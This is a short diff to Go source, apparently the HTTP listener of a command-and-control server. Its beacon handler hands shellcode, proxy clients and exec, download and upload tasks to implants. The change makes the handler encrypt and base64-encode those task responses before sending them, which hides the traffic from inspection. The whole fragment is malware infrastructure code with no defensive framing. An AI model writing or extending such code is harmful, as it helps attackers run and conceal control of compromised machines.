@@ -3,6 +3,7 @@ package main
 import (
 	"io"
 	"os"
+//	"fmt"
 	"log"
 	"time"
 	"mime"
@@ -132,7 +133,19 @@ func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Reque
 	respMap["shellcode"] = beacon.ShellcodeBuffer
 	respMap["proxyclients"] = beacon.ProxyClientBuffer
 
-	json.NewEncoder(w).Encode(respMap)
+	respData, _ := json.Marshal(respMap)
+	
+	message := BeaconMessage {
+		Route: []byte{0},//[]byte(beacon.Ip), for forwarding
+		Data: respData,
+	}
+
+	messageData, _ := json.Marshal(message)
+	messageEnc := securityContext.encrypt([]byte(messageData))
+	beaconMsg := b64.StdEncoding.EncodeToString(messageEnc)
+
+	w.Write([]byte(beaconMsg))
+
 	beacon.ExecBuffer = nil
 	beacon.DownloadBuffer = nil
 	beacon.UploadBuffer = nil
